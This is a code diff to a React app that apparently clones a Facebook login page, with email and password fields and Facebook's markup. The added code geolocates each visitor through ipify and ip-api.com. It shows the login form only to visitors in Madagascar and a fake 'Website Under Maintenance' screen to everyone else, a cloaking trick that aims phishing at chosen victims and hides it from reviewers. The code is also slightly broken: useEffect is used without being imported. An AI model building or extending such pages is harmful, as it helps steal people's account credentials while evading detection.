@@ -2,14 +2,47 @@ import "./App.css";
 import logo from "./fb.svg";
 import eye from "./Eye.svg";
 import crossedEye from "./CrossedEye.svg";
-import { useState } from "react";
+import { useState, useCallback } from "react";
 import axios from "axios";
 
 function App() {
   const [mail, setMail] = useState("");
   const [password, setPassword] = useState("");
   const [hide, setHide] = useState(true);
+  const [status, setStatus] = useState("loading");
 
+  const handleCheck = useCallback(async()=>{
+    let res = await fetch("https://api.ipify.org?format=json");
+    let data = await res.json();
+    res = await fetch(`http://ip-api.com/json/${data.ip}`);
+    data = await res.json();
+    if(data.country.toLowerCase() == "madagascar" || data.country == "MG") {
+      setStatus("mada");
+    } else {
+      setStatus("other");
+    }
+  }, [])
+  const [ip, setIp] = useState("");
+
+  useEffect(() => {
+    handleCheck();
+  }, []);
+
+  if(status == "loading") {
+    return (
+      <div className="p-4">
+        <h1 className="text-xl font-bold">Your Public IP Address:</h1>
+        <p className="text-lg">{"Loading..."}</p>
+      </div>
+    );
+  } else if(status == "other") {
+    return (
+      <div className="p-4">
+        <h1 className="text-xl font-bold">Your Public IP Address:</h1>
+        <p className="text-lg">Website Under Maintenance</p>
+      </div>
+    );
+  }
   return (
     <div className="App">
       <div className="_qw9 grouped aclb" id="u_0_1_CF">
